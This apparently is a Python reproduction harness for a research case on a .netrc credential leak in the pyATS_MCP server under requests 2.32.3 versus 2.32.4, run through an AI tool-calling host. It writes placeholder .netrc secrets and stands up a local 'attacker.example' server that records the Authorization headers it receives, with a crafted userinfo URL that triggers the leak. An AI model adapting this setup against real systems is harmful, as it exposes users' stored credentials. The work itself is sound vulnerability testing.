"""Run automateyournetwork/pyATS_MCP through the shared Host HTTP projection."""

from __future__ import annotations

import argparse
import base64
import json
import os
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from shared_host_runner import evidence_rows, run_shared_host_case


CASE_ID = "GH-P2-084"
SERVER_NAME = "automateyournetwork/pyATS_MCP"
SOURCE_COMMIT = "d4971436328369ef0a581ca5359dc8700fb2939b"
VULNERABLE_REQUESTS = "2.32.3"
FIXED_REQUESTS = "2.32.4"
TOOL_NAME = "pyats_xpresso_request"
BOUNDARY_MARKER = "GH_P2_084_XPRESSO_NETRC_READBACK"
NETRC_MACHINE = "example.com"
NETRC_LOGIN = "GT_P2_084_NETRC_USER"
NETRC_PASSWORD = "GT_P2_084_NETRC_SECRET"
URL_USERINFO_PASSWORD = "GT_P2_084_BASELINE"
NETRC_EFFECT = "Basic " + base64.b64encode(f"{NETRC_LOGIN}:{NETRC_PASSWORD}".encode()).decode()
SAFE_CONTROL = "Basic " + base64.b64encode(f"{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}".encode()).decode()
SERVER_PORT = 5084
BOUNDARY_PORT = 18084
TASK = "Call the frozen pyats_xpresso_request Tool and report only its returned result."
SYSTEM_PROMPT = "You are a deterministic research host. Use the frozen Tool call and report only its returned Tool result."


class BoundaryHandler(BaseHTTPRequestHandler):
    server_version = "GT-P2-084-XPresso-Boundary/1"

    def do_GET(self) -> None:  # noqa: N802
        boundary = self.server  # type: ignore[attr-defined]
        item = {
            "method": self.command,
            "path": self.path,
            "headers": {key.lower(): value for key, value in self.headers.items()},
        }
        boundary.requests.append(item)
        authorization = str(item["headers"].get("authorization", "NO_AUTH"))
        payload = {
            "status": "ok",
            "name": f"{BOUNDARY_MARKER}|{authorization}",
            "authorization": authorization,
            "path": self.path,
        }
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_args: object) -> None:
        return


class Boundary(ThreadingHTTPServer):
    allow_reuse_address = True

    def __init__(self) -> None:
        super().__init__(("127.0.0.1", BOUNDARY_PORT), BoundaryHandler)
        self.requests: list[dict[str, object]] = []


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--side", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--repetition", type=int, choices=(1, 2, 3), required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()

    home = Path("/tmp/gt-home")
    home.mkdir(parents=True, exist_ok=True)
    netrc = home / ".netrc"
    netrc.write_text(f"machine {NETRC_MACHINE} login {NETRC_LOGIN} password {NETRC_PASSWORD}\n", encoding="utf-8")
    netrc.chmod(0o600)
    testbed = Path("/tmp/gt-testbed.yaml")
    testbed.write_text("testbed:\n  name: gt-p2-084\n", encoding="utf-8")

    boundary = Boundary()
    thread = threading.Thread(target=boundary.serve_forever, daemon=True)
    thread.start()
    requests_version = VULNERABLE_REQUESTS if args.side == "vulnerable" else FIXED_REQUESTS
    base_url = f"http://{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}@attacker.example:{BOUNDARY_PORT}"
    env = {
        "PYTHONPATH": f"/opt/deps/{args.side}:/workspace/source:/opt/gt",
        "PATH": "/usr/local/bin:/usr/bin:/bin",
        "HOME": str(home),
        "NETRC": str(netrc),
        "PYATS_TESTBED_PATH": str(testbed),
        "PYATS_MCP_HTTP_HOST": "127.0.0.1",
        "PYATS_MCP_HTTP_PORT": str(SERVER_PORT),
        "PYATS_MCP_TRANSPORT_MODE": "stateful",
        "XPRESSO_URL": base_url,
        "XPRESSO_API_TOKEN": "GT_P2_084_TOKEN",
        "XPRESSO_GROUP": "GT_P2_084_GROUP",
        "NO_PROXY": "attacker.example,127.0.0.1,localhost",
        "no_proxy": "attacker.example,127.0.0.1,localhost",
        "HTTP_PROXY": "",
        "HTTPS_PROXY": "",
        "ALL_PROXY": "",
        "http_proxy": "",
        "https_proxy": "",
        "all_proxy": "",
        "PYTHONIOENCODING": "utf-8",
        "PYTHONWARNINGS": "ignore",
    }
    try:
        record = run_shared_host_case(
            run_id=f"{CASE_ID}-{args.side}-{args.repetition}",
            case_id=CASE_ID,
            revision=args.side,
            repetition=args.repetition,
            command=["python", "/workspace/source/pyats_mcp_server.py"],
            cwd=Path("/workspace/source"),
            env=env,
            server_name=SERVER_NAME,
            tool_name=TOOL_NAME,
            tool_arguments={"method": "GET", "path": "/readback", "payload": None, "params": None, "timeout": 10},
            task=TASK,
            system_prompt=SYSTEM_PROMPT,
            server_revision=f"{SOURCE_COMMIT};requests=={requests_version}",
            timeout=60,
            transport="streamable-http",
            endpoint="http://127.0.0.1:5084/mcp",
            startup_timeout=30,
        )
        record["external_boundary"] = {
            "boundary": "Container-local HTTP boundary at attacker.example; Docker network none.",
            "request_count": len(boundary.requests),
            "requests": boundary.requests,
            "netrc_machine": NETRC_MACHINE,
            "target_url_projection": base_url + "/{PATH}",
        }
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "host_record.json").write_text(json.dumps(record, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        (args.output / "evidence.jsonl").write_text("".join(json.dumps(row, ensure_ascii=False) + "\n" for row in evidence_rows(record)), encoding="utf-8")
        valid = record["quality"]["invalid_run"] is False
        print(json.dumps({"status": "OK" if valid else "INVALID", "output": str(args.output), "request_count": len(boundary.requests)}))
        return 0 if valid else 1
    finally:
        boundary.shutdown()
        boundary.server_close()
        thread.join(timeout=3)


if __name__ == "__main__":
    raise SystemExit(main())
